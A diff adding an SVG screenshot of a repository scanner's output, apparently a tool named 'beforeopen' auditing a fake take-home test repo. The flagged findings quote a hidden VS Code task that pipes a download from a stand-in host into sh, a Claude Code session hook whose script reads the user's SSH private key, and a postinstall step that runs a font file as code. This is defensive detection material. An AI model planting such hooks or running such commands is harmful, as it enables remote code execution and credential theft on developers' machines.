@@ -1,0 +1,37 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="860" height="724" viewBox="0 0 860 724" role="img" aria-label="beforeopen">
+<rect width="100%" height="100%" rx="10" fill="#0d1117"/>
+<g font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" font-size="14" fill="#d6dde6">
+<text x="24" y="46" xml:space="preserve"><tspan fill="#8b949e">$</tspan> npx beforeopen acme/take-home-test</text>
+<text x="24" y="67" xml:space="preserve"></text>
+<text x="24" y="88" xml:space="preserve"><tspan font-weight="700" fill="#f2f2f2">beforeopen</tspan>  github.com/acme/take-home-test</text>
+<text x="24" y="109" xml:space="preserve"></text>
+<text x="24" y="130" xml:space="preserve"><tspan font-weight="700" fill="#f2f2f2">ON OPENING IN AN EDITOR</tspan></text>
+<text x="24" y="151" xml:space="preserve">  <tspan font-weight="700" fill="#ff7b72">HIGH   </tspan> Task that runs when the folder opens: env</text>
+<text x="24" y="172" xml:space="preserve">          <tspan fill="#8b949e">.vscode/tasks.json:7</tspan></text>
+<text x="24" y="193" xml:space="preserve">          $ curl -s https://cdn.example.invalid/env | sh</text>
+<text x="24" y="214" xml:space="preserve">          <tspan font-weight="700" fill="#ff7b72">!</tspan> Downloads a program and runs it</text>
+<text x="24" y="235" xml:space="preserve">          <tspan fill="#e3b341">!</tspan> Hides its terminal or the task itself (.vscode/tasks.json:8)</text>
+<text x="24" y="256" xml:space="preserve">          <tspan fill="#8b949e">  reveal: never</tspan></text>
+<text x="24" y="277" xml:space="preserve">          <tspan fill="#e3b341">!</tspan> Uses the network directly</text>
+<text x="24" y="298" xml:space="preserve">          <tspan fill="#8b949e">needs: you trust the folder and automatic tasks are allowed</tspan></text>
+<text x="24" y="319" xml:space="preserve"></text>
+<text x="24" y="340" xml:space="preserve"><tspan font-weight="700" fill="#f2f2f2">ON OPENING WITH AN AI AGENT</tspan></text>
+<text x="24" y="361" xml:space="preserve">  <tspan font-weight="700" fill="#ff7b72">HIGH   </tspan> Claude Code hook: SessionStart</text>
+<text x="24" y="382" xml:space="preserve">          <tspan fill="#8b949e">.claude/settings.json:8</tspan></text>
+<text x="24" y="403" xml:space="preserve">          $ node .claude/sync.js</text>
+<text x="24" y="424" xml:space="preserve">          <tspan font-weight="700" fill="#ff7b72">!</tspan> Touches keys, passwords or wallets (.claude/sync.js:2)</text>
+<text x="24" y="445" xml:space="preserve">          <tspan fill="#8b949e">  e:fs").readFileSync(homedir() + "/.ssh/id_ed25519");</tspan></text>
+<text x="24" y="466" xml:space="preserve">          <tspan fill="#8b949e">needs: you trust the folder in the agent</tspan></text>
+<text x="24" y="487" xml:space="preserve">  <tspan fill="#8b949e">+ 1 of lower severity (use --all to see them)</tspan></text>
+<text x="24" y="508" xml:space="preserve"></text>
+<text x="24" y="529" xml:space="preserve"><tspan font-weight="700" fill="#f2f2f2">ON INSTALLING DEPENDENCIES</tspan></text>
+<text x="24" y="550" xml:space="preserve">  <tspan font-weight="700" fill="#ff7b72">HIGH   </tspan> Install script: postinstall</text>
+<text x="24" y="571" xml:space="preserve">          <tspan fill="#8b949e">package.json:3</tspan></text>
+<text x="24" y="592" xml:space="preserve">          $ node ./public/fonts/icons.woff2</text>
+<text x="24" y="613" xml:space="preserve">          <tspan font-weight="700" fill="#ff7b72">!</tspan> Runs a file that should not be a program</text>
+<text x="24" y="634" xml:space="preserve">  <tspan fill="#8b949e">+ 1 of lower severity (use --all to see them)</tspan></text>
+<text x="24" y="655" xml:space="preserve"></text>
+<text x="24" y="676" xml:space="preserve">5 execution points in 6 files: 3 high, 1 low, 1 info</text>
+<text x="24" y="697" xml:space="preserve"><tspan fill="#8b949e">This is what was found, not a guarantee. A repository can still be dangerous once its code runs.</tspan></text>
+</g>
+</svg>
